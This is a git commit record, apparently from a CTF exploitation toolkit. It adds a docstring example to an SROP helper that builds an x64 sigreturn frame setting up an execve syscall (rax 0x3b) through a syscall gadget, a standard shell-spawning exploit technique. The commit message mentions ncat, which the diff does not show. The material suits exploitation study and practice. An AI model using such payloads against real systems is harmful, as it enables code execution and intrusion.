3362989ead5ee1fd4a5d05763f43469ea9316092
Zet <zetpc235@gmail.com>
2016-01-28 13:11:23 +0000

    add ndog(ncat)

--- pwnable/srop.py
+++ pwnable/srop.py
@@ -1,5 +1,19 @@
 '''
 from https://github.com/eQu1NoX/srop-poc/blob/master/Frame.py
+
+example::
+
+syscall = 0x40056f
+
+frame = srop(arch="x64")
+frame.set("rax", 0x3b)
+frame.set("rdi", 0x601040)
+frame.set("rsi", 0x0)
+frame.set("rdx", 0x1)
+frame.set("rsp", 0x601040)
+frame.set("rbp", 0x601050)
+frame.set("rip", syscall)
+srop = frame.get_srop()
 '''
 
 import struct
